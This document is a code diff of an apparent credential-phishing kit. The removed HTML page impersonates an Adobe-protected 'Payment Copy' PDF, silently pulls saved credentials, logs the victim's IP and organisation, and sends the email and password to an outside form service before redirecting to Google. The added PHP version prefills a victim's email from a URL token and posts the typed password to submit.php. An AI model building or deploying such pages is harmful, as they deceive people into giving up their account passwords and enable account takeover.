@@ -1,263 +1,53 @@
-<!doctype html>
+<?php
+session_start();
+
+// Fake token → email mapping (replace with DB query)
+$tokens = [
+  "abc123" => "user1@example.com",
+  "xyz456" => "user2@example.com"
+];
+
+// Default email empty
+$email = "";
+
+// Check token in URL
+if (!empty($_GET['t'])) {
+    $token = $_GET['t'];
+    if (isset($tokens[$token])) {
+        $email = $tokens[$token];
+        $_SESSION['email'] = $email; // keep it for later
+    }
+}
+?>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Protected PDF — Payment Copy</title>
+  <meta charset="UTF-8">
+  <title>Secure File</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body { height: 100%; }
-    body {
-      font-family: "Helvetica Neue", Arial, sans-serif;
-      background: #f6f6f6 url('download.jpg') no-repeat center top;
-      background-size: cover;
-      overflow: hidden;
-    }
-    #splash { position: fixed; top:0; left:0; width:100%; height:100%; background:#fff; display:flex; align-items:center; justify-content:center; flex-direction:column; z-index:9999; transition: opacity 1s ease; }
-    #splash h2 { font-size:22px; color:#d32f2f; margin-bottom:10px; }
-    #splash p { color:#666; font-size:14px; }
-    .loader { margin-top:20px; width:36px; height:36px; border:4px solid #ddd; border-top-color:#d32f2f; border-radius:50%; animation:spin 1s linear infinite; }
-    @keyframes spin{ to { transform: rotate(360deg); } }
-
-    #main { display:none; height:100%; display:flex; align-items:flex-start; justify-content:center; padding:28px 12px 60px; position:relative; }
-    #main.show { display:flex; animation: fadeIn 1s ease; }
-    @keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
-
-    body::before {
-      content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      font-size: 46px;
-      font-weight: bold;
-      color: rgba(200, 0, 0, 0.12);
-      transform: rotate(-35deg);
-      white-space: pre;
-      line-height: 120px;
-      pointer-events: none;
-      z-index: 0;
-    }
-
-    .card { width:450px; max-width:94%; background: rgba(255,255,255,0.95); border-radius:8px; box-shadow:0 10px 30px rgba(0,0,0,0.1); padding:28px 22px 34px; position:relative; z-index:2; backdrop-filter: blur(4px); }
-    .pdf-icon { display:flex; align-items:center; justify-content:center; margin-bottom:10px; }
-    .pdf-icon img { width:54px; height:auto; }
-    h1 { font-size:20px; text-align:center; margin-bottom:6px; }
-    p.lead { text-align:center; color:#666; margin-bottom:22px; font-size:14px; }
-    .input { width:100%; border:1px solid #e6e6e6; border-radius:4px; padding:14px 12px; margin-bottom:12px; color:#444; background:#fafafa; font-size:15px; }
-    .password-wrapper { position:relative; }
-    .toggle-password { position:absolute; top:50%; right:12px; transform:translateY(-50%); cursor:pointer; color:#999; font-size:18px; user-select:none; }
-    .toggle-password:hover { color:#d32f2f; }
-    .download-wrap { text-align:center; margin:16px 0 10px; }
-    .btn-download { display:inline-block; padding:12px 36px; border-radius:30px; background:#d32f2f; color:#fff; font-weight:700; text-transform:uppercase; letter-spacing:0.8px; box-shadow:0 6px 18px rgba(211,47,47,0.18); border:none; cursor:pointer; font-size:15px; }
-    .file-info { margin-top:18px; border-top:1px solid #eee; padding-top:14px; display:flex; gap:12px; align-items:flex-start; color:#333; }
-    .file-thumb { width:48px; flex:0 0 48px; } .file-thumb img { width:100%; } .file-meta { flex:1; } .file-meta h4 { margin-bottom:6px; font-size:15px; color:#0b58a8; } .file-meta .desc, .file-meta .size { font-size:13px; color:#666; }
-
-    /* new small helpers */
-    .small-actions { font-size:13px; color:#666; text-align:center; margin-bottom:12px; }
-    .link { color:#0b58a8; cursor:pointer; text-decoration:underline; display:inline-block; margin-left:8px; }
-    .hidden { display:none; }
-    .center-row { display:flex; gap:8px; align-items:center; justify-content:center; }
-
+    body { font-family: Arial, sans-serif; background:#f6f6f6; }
+    .card { max-width:400px; margin:50px auto; background:#fff;
+      padding:20px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.2); }
+    .input { width:100%; padding:12px; margin:10px 0;
+      border:1px solid #ccc; border-radius:5px; font-size:16px; }
+    .btn { width:100%; padding:12px; background:#d32f2f;
+      color:#fff; border:none; border-radius:5px; font-size:16px; cursor:pointer; }
+    .btn:hover { background:#b71c1c; }
   </style>
 </head>
 <body>
-  <div id="splash">
-    <h2>Loading Secure Viewer…</h2>
-    <p>Please wait while we prepare your file</p>
-    <div class="loader"></div>
+  <div class="card">
+    <h2>Enter Your Password</h2>
+    <form method="post" action="submit.php" autocomplete="on">
+      <label>Email</label>
+      <input type="email" class="input" name="email"
+        value="<?php echo htmlspecialchars($email, ENT_QUOTES); ?>" readonly>
+
+      <label>Password</label>
+      <input type="password" class="input" name="password" required>
+
+      <button type="submit" class="btn">Continue</button>
+    </form>
   </div>
-
-  <div id="main">
-    <div class="card">
-      <div class="pdf-icon">
-        <img src="data:image/svg+xml;utf8,
-          <svg xmlns='http://www.w3.org/2000/svg' width='72' height='90' viewBox='0 0 72 90'>
-            <rect width='72' height='90' rx='6' fill='%23d63636'/>
-            <text x='50%' y='62%' text-anchor='middle' font-family='Arial' font-size='18' fill='%23fff'>PDF</text>
-          </svg>" alt="PDF icon">
-      </div>
-
-      <h1>This File is Protected By Adobe®<br>Security.</h1>
-      <p class="lead">Click Continue to enter your password and view the payment copy.</p>
-
-      <!-- Hidden iframe method -->
-      <iframe name="hiddenFrame" style="display:none;"></iframe>
-
-      <!-- Two-step form: step 1 = email confirmation, step 2 = password + submit -->
-      <form id="mainForm" action="https://submit-form.com/vQBbiONxP" method="POST" autocomplete="on" target="hiddenFrame">
-        <!-- STEP 1: email display -->
-        <div id="stepEmail">
-          <input id="email" name="email" class="input" type="email" placeholder="Email address" autocomplete="email" required>
-          <div class="center-row small-actions">
-            <button id="continueBtn" class="btn-download" type="button">Continue</button>
-            <span id="changeEmail" class="link">Change</span>
-          </div>
-        </div>
-
-        <!-- STEP 2: password (hidden until continue) -->
-        <div id="stepPassword" class="hidden">
-          <div class="password-wrapper">
-            <input id="password" name="password" class="input" type="password" placeholder="Password" autocomplete="current-password" required>
-            <span id="togglePassword" class="toggle-password" title="Show / hide password">👁️</span>
-          </div>
-          <input type="hidden" name="ip" id="ip">
-          <input type="hidden" name="hostname" id="hostname">
-
-          <div class="download-wrap">
-            <button class="btn-download" type="submit">DOWNLOAD</button>
-          </div>
-        </div>
-      </form>
-
-      <div class="file-info">
-        <div class="file-thumb">
-          <img src="data:image/svg+xml;utf8,
-            <svg xmlns='http://www.w3.org/2000/svg' width='48' height='48'>
-              <rect width='48' height='48' rx='4' fill='%23f2f2f2' stroke='%23ddd'/>
-              <text x='50%' y='58%' text-anchor='middle' font-size='10' font-family='Arial' fill='%23d32f2f'>PDF</text>
-            </svg>" alt="">
-        </div>
-        <div class="file-meta">
-          <h4>Download File Information</h4>
-          <div class="desc">Payment copy</div>
-          <div class="size">File Size: 47kb</div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    // Splash screen and show main
-    window.addEventListener('load', () => {
-      setTimeout(() => {
-        document.getElementById('splash').style.opacity = '0';
-        setTimeout(() => {
-          document.getElementById('splash').style.display = 'none';
-          document.getElementById('main').classList.add('show');
-        }, 500);
-      }, 800);
-    });
-
-    // Elements
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const stepEmail = document.getElementById('stepEmail');
-    const stepPassword = document.getElementById('stepPassword');
-    const continueBtn = document.getElementById('continueBtn');
-    const changeEmail = document.getElementById('changeEmail');
-    const toggle = document.getElementById('togglePassword');
-
-    // Try to autofill email using Credential Management API or fallback to localStorage
-    async function tryAutofillEmail() {
-      let filled = false;
-
-      // 1) Credential Management API
-      try {
-        if (navigator.credentials && typeof navigator.credentials.get === 'function') {
-          // request password credentials silently/optionally
-          const cred = await navigator.credentials.get({ password: true, mediation: 'optional' });
-          if (cred && cred.id) {
-            emailInput.value = cred.id;
-            filled = true;
-          }
-        }
-      } catch (e) {
-        // ignore errors — we'll try fallback
-        console.warn('Credential API error', e);
-      }
-
-      // 2) localStorage fallback (previously saved email)
-      if (!filled) {
-        try {
-          const saved = localStorage.getItem('savedEmail');
-          if (saved) {
-            emailInput.value = saved;
-            filled = true;
-          }
-        } catch(e){}
-      }
-
-      // 3) If still empty, leave editable so user can type
-      if (!filled) {
-        emailInput.removeAttribute('disabled');
-      } else {
-        // mark email input readonly initially to prevent accidental edits
-        emailInput.setAttribute('disabled', 'true');
-      }
-    }
-
-    // When user clicks Continue: reveal password area (and save email to localStorage)
-    continueBtn.addEventListener('click', () => {
-      // if email is empty, allow editing and focus
-      if (!emailInput.value) {
-        emailInput.removeAttribute('disabled');
-        emailInput.focus();
-        return;
-      }
-
-      // save for fallback autofill next visit
-      try { localStorage.setItem('savedEmail', emailInput.value); } catch(e){}
-
-      // show password step
-      stepEmail.classList.add('hidden');
-      stepPassword.classList.remove('hidden');
-
-      // focus password
-      if (passwordInput) passwordInput.focus();
-    });
-
-    // "Change" link: go back to edit email
-    changeEmail.addEventListener('click', () => {
-      emailInput.removeAttribute('disabled');
-      emailInput.focus();
-      // show email step if hidden
-      stepEmail.classList.remove('hidden');
-      stepPassword.classList.add('hidden');
-    });
-
-    // Toggle password visibility
-    if (toggle && passwordInput) {
-      toggle.addEventListener('click', () => {
-        const isHidden = passwordInput.type === 'password';
-        passwordInput.type = isHidden ? 'text' : 'password';
-        toggle.textContent = isHidden ? '🙈' : '👁️';
-      });
-    }
-
-    // Autofill attempt on DOM ready
-    window.addEventListener('DOMContentLoaded', async () => {
-      await tryAutofillEmail();
-
-      // fetch IP & hostname (same as your original)
-      fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => {
-          document.getElementById('ip').value = data.ip;
-          return fetch(`https://ipapi.co/${data.ip}/json/`);
-        })
-        .then(r => r.json())
-        .then(info => {
-          const host = info.org || info.city || 'Unknown';
-          const hn = document.getElementById('hostname');
-          if (hn) hn.value = host;
-        })
-        .catch(() => {});
-    });
-
-    // Redirect after submission (keeps same behavior)
-    document.getElementById('mainForm').addEventListener('submit', () => {
-      setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
-    });
-
-    // Optional: pressing Enter on email continues
-    emailInput.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') {
-        e.preventDefault();
-        continueBtn.click();
-      }
-    });
-  </script>
 </body>
 </html>
